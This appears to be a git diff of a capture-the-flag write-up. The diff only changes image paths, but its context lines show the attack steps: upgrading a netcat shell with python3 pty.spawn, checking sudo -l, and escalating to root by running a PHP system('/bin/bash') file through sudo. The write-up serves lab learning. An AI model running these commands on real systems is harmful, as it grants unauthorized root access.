@@ -19,10 +19,10 @@ we have Python3 avaliable and from there our netcat session has escalated
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ``` 
 
-![[Pasted image 20241007215316.png]]
+![[../2. Recon/Images/Pasted image 20241007215316.png]]
 
 we can now run commands like sudo -l to determine permissions
-![[Pasted image 20241007220720.png]]
+![[../2. Recon/Images/Pasted image 20241007220720.png]]
 
 Running these permissions through ChatGPT we can get a more human readable threat assessment.
 
@@ -62,8 +62,8 @@ echo '<?php system("/bin/bash"); ?>' > /tmp/root_shell.php
 sudo /usr/bin/php /tmp/root_shell.php
 ```
 
-![[Pasted image 20241007221231.png]]
+![[../2. Recon/Images/Pasted image 20241007221231.png]]
 
 We have now established ourselves as the root user and capture the final flag.
 
-![[Pasted image 20241007222806.png]]
+![[../2. Recon/Images/Pasted image 20241007222806.png]]
